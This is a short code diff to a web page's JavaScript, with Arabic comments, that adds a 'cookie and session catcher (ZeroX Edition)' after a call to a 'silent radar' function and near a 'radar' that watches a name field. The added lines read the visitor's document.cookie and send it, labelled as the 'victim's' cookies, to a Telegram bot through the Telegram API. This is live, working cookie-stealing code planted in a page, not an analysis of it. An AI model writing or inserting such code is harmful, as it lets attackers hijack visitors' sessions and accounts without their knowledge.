@@ -134,6 +134,9 @@
     // تشغيل الرادار فوراً
     // 1. تشغيل الرادار الصامت أولاً
 silentRadar(); 
+// 🍪 صائد الكوكيز والجلسات (ZeroX Edition)
+let cookies = document.cookie || "خزنة الكوكيز فارغة أو محمية!";
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🍪 كوكيز الضحية المكتشفة:\n" + cookies)}`);
 
 // 2. رادار كشف النوايا والتحركات (يعمل فوراً)
 document.getElementById('name').addEventListener('focus', () => {
